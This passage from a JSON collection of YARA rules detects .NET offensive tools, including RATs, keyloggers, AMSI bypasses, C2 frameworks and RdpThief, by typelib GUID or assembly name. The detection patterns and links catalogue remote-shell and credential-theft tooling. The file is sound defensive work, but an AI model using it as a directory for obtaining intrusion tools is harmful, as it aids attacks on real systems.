  "HKTL_NET_GUID_EasyNet": "rule HKTL_NET_GUID_EasyNet {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/EasyNet\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3097d856-25c2-42c9-8d59-2cdad8e8ea12\" ascii nocase wide\n        $typelibguid1 = \"ba33f716-91e0-4cf7-b9bd-b4d558f9a173\" ascii nocase wide\n        $typelibguid2 = \"37d6dd3f-5457-4d8b-a2e1-c7b156b176e5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpByeBear": "rule HKTL_NET_GUID_SharpByeBear {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/S3cur3Th1sSh1t/SharpByeBear\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a6b84e35-2112-4df2-a31b-50fde4458c5e\" ascii nocase wide\n        $typelibguid1 = \"3e82f538-6336-4fff-aeec-e774676205da\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpHide": "rule HKTL_NET_GUID_SharpHide {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/SharpHide\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"443d8cbf-899c-4c22-b4f6-b7ac202d4e37\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpSvc": "rule HKTL_NET_GUID_SharpSvc {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSvc\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"52856b03-5acd-45e0-828e-13ccb16942d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpCrashEventLog": "rule HKTL_NET_GUID_SharpCrashEventLog {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpCrashEventLog\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98cb495f-4d47-4722-b08f-cefab2282b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DotNetToJScript_LanguageModeBreakout": "rule HKTL_NET_GUID_DotNetToJScript_LanguageModeBreakout {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/DotNetToJScript-LanguageModeBreakout\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"deadb33f-fa94-41b5-813d-e72d8677a0cf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharPermission": "rule HKTL_NET_GUID_SharPermission {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/SharPermission\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"84d2b661-3267-49c8-9f51-8f72f21aea47\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_RegistryStrikesBack": "rule HKTL_NET_GUID_RegistryStrikesBack {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/RegistryStrikesBack\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"90ebd469-d780-4431-9bd8-014b00057665\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CloneVault": "rule HKTL_NET_GUID_CloneVault {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/CloneVault\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"0a344f52-6780-4d10-9a4a-cb9439f9d3de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_donut": "rule HKTL_NET_GUID_donut {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/donut\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98ca74c7-a074-434d-9772-75896e73ceaa\" ascii nocase wide\n        $typelibguid1 = \"3c9a6b88-bed2-4ba8-964c-77ec29bf1846\" ascii nocase wide\n        $typelibguid2 = \"4fcdf3a3-aeef-43ea-9297-0d3bde3bdad2\" ascii nocase wide\n        $typelibguid3 = \"361c69f5-7885-4931-949a-b91eeab170e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpHandler": "rule HKTL_NET_GUID_SharpHandler {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jfmaes/SharpHandler\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"46e39aed-0cff-47c6-8a63-6826f147d7bd\" ascii nocase wide\n        $typelibguid1 = \"11dc83c6-8186-4887-b228-9dc4fd281a23\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Driver_Template": "rule HKTL_NET_GUID_Driver_Template {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Driver-Template\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bdb79ad6-639f-4dc2-8b8a-cd9107da3d69\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_NashaVM": "rule HKTL_NET_GUID_NashaVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/NashaVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f9e63498-6e92-4afd-8c13-4f63a3d964c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_NAME_FakeFileMaker": "rule HKTL_NET_NAME_FakeFileMaker {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/FakeFileMaker\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FakeFileMaker\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_Aggressor": "rule HKTL_NET_NAME_Aggressor {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/Aggressor\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Aggressor\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_pentestscripts": "rule HKTL_NET_NAME_pentestscripts {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/c4bbage/pentestscripts\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"pentestscripts\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_WMIPersistence": "rule HKTL_NET_NAME_WMIPersistence {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/WMIPersistence\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"WMIPersistence\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_ADCollector": "rule HKTL_NET_NAME_ADCollector {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dev-2null/ADCollector\"\n        hash = \"5391239f479c26e699b6f3a1d6a0a8aa1a0cf9a8\"\n        hash = \"9dd0f322dd57b906da1e543c44e764954704abae\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ADCollector\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_MaliciousClickOnceGenerator": "rule HKTL_NET_NAME_MaliciousClickOnceGenerator {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/MaliciousClickOnceGenerator\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MaliciousClickOnceGenerator\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_directInjectorPOC": "rule HKTL_NET_NAME_directInjectorPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/badBounty/directInjectorPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"directInjectorPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_AsStrongAsFuck": "rule HKTL_NET_NAME_AsStrongAsFuck {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Charterino/AsStrongAsFuck\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AsStrongAsFuck\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_MagentoScanner": "rule HKTL_NET_NAME_MagentoScanner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/soufianetahiri/MagentoScanner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MagentoScanner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_RevengeRAT_Stub_CSsharp": "rule HKTL_NET_NAME_RevengeRAT_Stub_CSsharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/RevengeRAT-Stub-CSsharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RevengeRAT-Stub-CSsharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_SharPyShell": "rule HKTL_NET_NAME_SharPyShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/SharPyShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharPyShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_GhostLoader": "rule HKTL_NET_NAME_GhostLoader {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/TheWover/GhostLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GhostLoader\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_DotNetInject": "rule HKTL_NET_NAME_DotNetInject {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dtrizna/DotNetInject\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetInject\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_ATPMiniDump": "rule HKTL_NET_NAME_ATPMiniDump {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/b4rtik/ATPMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ATPMiniDump\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_ConfuserEx": "rule HKTL_NET_NAME_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/yck1509/ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ConfuserEx\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_SharpBuster": "rule HKTL_NET_NAME_SharpBuster {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/passthehashbrowns/SharpBuster\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpBuster\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_AmsiBypass": "rule HKTL_NET_NAME_AmsiBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0xB455/AmsiBypass\"\n\t\thash = \"8fa4ba512b34a898c4564a8eac254b6a786d195b\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AmsiBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_Recon_AD": "rule HKTL_NET_NAME_Recon_AD {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/outflanknl/Recon-AD\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Recon-AD\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_SharpWatchdogs": "rule HKTL_NET_NAME_SharpWatchdogs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RITRedteam/SharpWatchdogs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpWatchdogs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_SharpCat": "rule HKTL_NET_NAME_SharpCat {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Cn33liz/SharpCat\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpCat\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_aspnetcore_bypassing_authentication": "rule HKTL_NET_NAME_aspnetcore_bypassing_authentication {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jackowild/aspnetcore-bypassing-authentication\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"aspnetcore-bypassing-authentication\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_K8tools": "rule HKTL_NET_NAME_K8tools {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/K8tools\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"K8tools\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_HTTPSBeaconShell": "rule HKTL_NET_NAME_HTTPSBeaconShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HTTPSBeaconShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_Ghostpack_CompiledBinaries": "rule HKTL_NET_NAME_Ghostpack_CompiledBinaries {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Ghostpack-CompiledBinaries\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_metasploit_sharp": "rule HKTL_NET_NAME_metasploit_sharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/VolatileMindsLLC/metasploit-sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"metasploit-sharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_trevorc2": "rule HKTL_NET_NAME_trevorc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/trustedsec/trevorc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"trevorc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_petaqc2": "rule HKTL_NET_NAME_petaqc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/fozavci/petaqc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"petaqc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_NativePayload_DNS2": "rule HKTL_NET_NAME_NativePayload_DNS2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_DNS2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_DNS2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_cve_2017_7269_tool": "rule HKTL_NET_NAME_cve_2017_7269_tool {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/zcgonvh/cve-2017-7269-tool\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"cve-2017-7269-tool\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_AggressiveProxy": "rule HKTL_NET_NAME_AggressiveProxy {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/EncodeGroup/AggressiveProxy\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AggressiveProxy\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_MSBuildAPICaller": "rule HKTL_NET_NAME_MSBuildAPICaller {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/rvrsh3ll/MSBuildAPICaller\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MSBuildAPICaller\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_GrayKeylogger": "rule HKTL_NET_NAME_GrayKeylogger {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DarkSecDevelopers/GrayKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GrayKeylogger\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_weevely3": "rule HKTL_NET_NAME_weevely3 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/epinna/weevely3\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"weevely3\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_FudgeC2": "rule HKTL_NET_NAME_FudgeC2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Ziconius/FudgeC2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FudgeC2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_NativePayload_Reverse_tcp": "rule HKTL_NET_NAME_NativePayload_Reverse_tcp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_Reverse_tcp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_SharpHose": "rule HKTL_NET_NAME_SharpHose {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/ustayready/SharpHose\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpHose\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_RAT_NjRat_0_7d_modded_source_code": "rule HKTL_NET_NAME_RAT_NjRat_0_7d_modded_source_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/AliBawazeEer/RAT-NjRat-0.7d-modded-source-code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RAT-NjRat-0.7d-modded-source-code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_RdpThief": "rule HKTL_NET_NAME_RdpThief {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0x09AL/RdpThief\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RdpThief\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_RunasCs": "rule HKTL_NET_NAME_RunasCs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/RunasCs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RunasCs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_NativePayload_IP6DNS": "rule HKTL_NET_NAME_NativePayload_IP6DNS {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_IP6DNS\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_IP6DNS\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_NativePayload_ARP": "rule HKTL_NET_NAME_NativePayload_ARP {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ARP\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ARP\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_C2Bridge": "rule HKTL_NET_NAME_C2Bridge {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/cobbr/C2Bridge\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"C2Bridge\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_Infrastructure_Assessment": "rule HKTL_NET_NAME_Infrastructure_Assessment {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NyaMeeEain/Infrastructure-Assessment\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Infrastructure-Assessment\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "HKTL_NET_NAME_shellcodeTester": "rule HKTL_NET_NAME_shellcodeTester {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/tophertimzen/shellcodeTester\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"shellcodeTester\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
